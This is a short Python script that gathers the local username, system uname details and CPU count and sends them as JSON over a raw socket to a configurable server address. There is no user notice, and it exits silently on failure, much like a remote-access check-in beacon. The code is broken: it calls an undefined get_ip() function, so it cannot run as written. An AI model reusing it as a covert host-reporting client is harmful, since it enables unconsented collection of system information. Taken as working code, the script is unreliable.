import socket
import json
import sys
import platform
import os

SERVER_HOST = '127.0.0.1'  # Your Ip | Server Ip
SERVER_PORT = 5000

def send_to_server(message_dict):
    msg = json.dumps(message_dict) + '\n'
    try:
        with socket.create_connection((SERVER_HOST, SERVER_PORT), timeout=5) as s:
            s.sendall(msg.encode('utf-8'))
    except Exception as e:
        sys.exit(1)

def main():
    my_ip = get_ip()
    payload = {
        "user": os.getlogin(),
        "uname": platform.uname(),
        "cpu": os.cpu_count()
    }
    send_to_server(payload)

if __name__ == '__main__':
    main()
